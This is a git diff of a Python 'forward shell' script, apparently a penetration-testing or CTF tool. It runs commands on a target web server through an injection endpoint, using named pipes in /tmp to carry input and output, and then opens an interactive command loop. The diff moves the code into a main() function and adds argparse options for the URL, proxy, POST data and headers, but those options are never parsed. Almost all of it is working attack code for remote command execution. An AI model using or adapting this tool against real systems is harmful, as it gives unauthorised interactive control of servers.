@@ -5,6 +5,7 @@ import threading
 import sys
 from base64 import b64encode
 import random
+import argparse
 from time import sleep
 
 # EDIT THIS
@@ -13,8 +14,8 @@ url = ""
 
 # Create pipe
 tmp_name = random.randrange(10000,99999)
-input_name = f"/tmp/in{tmp_name}"
-output_name = f"/tmp/out{tmp_name}"
+input_name = f"/tmp/in_{tmp_name}"
+output_name = f"/tmp/out_{tmp_name}"
 
 def recvOutput():
     payload = f"/usr/bin/cat {output_name} && /usr/bin/echo -n '' > {output_name}"
@@ -44,51 +45,59 @@ def createPipeListen():
     return r.text
 
 
-init = threading.Thread(target=createPipeListen, args=())
-init.start()
-print("basliye 5 sn")
-sleep(5)
+def main():
+    init = threading.Thread(target=createPipeListen, args=())
+    init.start()
+    print("basliye 5 sn")
+    sleep(5)
 
-print("payload gitti")
-sendPayload("id")
+    print("payload gitti")
+    sendPayload("id")
 
-print("bekle 1 sn geliyor")
-sleep(1)
-print(recvOutput())
-print("geldi")
+    print("bekle 1 sn geliyor")
+    sleep(1)
+    print(recvOutput())
+    print("geldi")
 
-def lis_th():
+    def lis_th():
+        while True:
+            txt = recvOutput()
+            print(txt, end='')
+            sleep(1)
+
+    listenin_th = threading.Thread(target=lis_th, args=())
+    listenin_th.start()
+
+    """
     while True:
-        txt = recvOutput()
-        print(txt, end='')
-        sleep(1)
-
-listenin_th = threading.Thread(target=lis_th, args=())
-listenin_th.start()
-
-"""
-while True:
-    inp = input()
-    txt = sendPayload(inp)
-    print(recvOutput(), end='')
-"""
-
-import cmd
-
-class Shell(cmd.Cmd):
-    
-    prompt = ''
-
-    def default(self, line):
-        sendPayload(line)
+        inp = input()
+        txt = sendPayload(inp)
         print(recvOutput(), end='')
+    """
 
-print("cmd zaman")
+    import cmd
 
-Shell().cmdloop()
+    class Shell(cmd.Cmd):
+        
+        prompt = ''
+
+        def default(self, line):
+            sendPayload(line)
+            print(recvOutput(), end='')
+
+    print("cmd zaman")
+
+    Shell().cmdloop()
 
 
-print("bitirmek gerek tmp silmek fln")
+    print("bitirmek gerek tmp silmek fln")
 
 
+argparser = argparse.ArgumentParser(description='Forward Shell')
+argparser.add_argument('-u', '--url', help='URL to send requests to', required=True)
+argparser.add_argument('-p', '--proxy', help='Proxy to use (http:127.0.0.1:8080)', required=False)
+argparser.add_argument('-d', '--data', help='Send POST request', required=False)
+argparser.add_argument('-H', '--header', help='Add header to request', required=False)
 
+if __name__ == "__main__":
+    main()
